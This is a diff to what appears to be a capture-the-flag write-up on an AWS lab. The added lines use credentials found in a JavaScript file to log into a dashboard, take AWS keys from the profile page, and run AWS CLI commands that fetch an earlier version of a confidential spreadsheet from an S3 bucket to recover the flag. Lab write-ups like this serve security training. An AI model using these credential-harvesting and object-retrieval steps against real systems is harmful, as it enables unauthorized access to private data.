@@ -38,4 +38,13 @@ aws s3api get-object --bucket huge-logistics-dashboard --key "static/js/auth.js"
 	password
 ```
 
-Now we can login to the dashboard!
+Now we can login to the dashboard with the creds found in `auto_previous.js`! Going to profile, we find AWS keys. Use them to login and grab that confidential `.xlsx` file we saw earlier with the `version-id`:
+
+```bash
+aws configure --profile admin
+aws s3api get-object --bucket huge-logistics-dashboard --key "private/Business Health - Board Meeting (Confidential).xlsx" --version-id "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" 'Business Health - Board Meeting (Confidential).xlsx' --profile admin
+```
+
+We find the flag in this `.xlsx`
+
+![[Pasted image 20260605144824.png]]
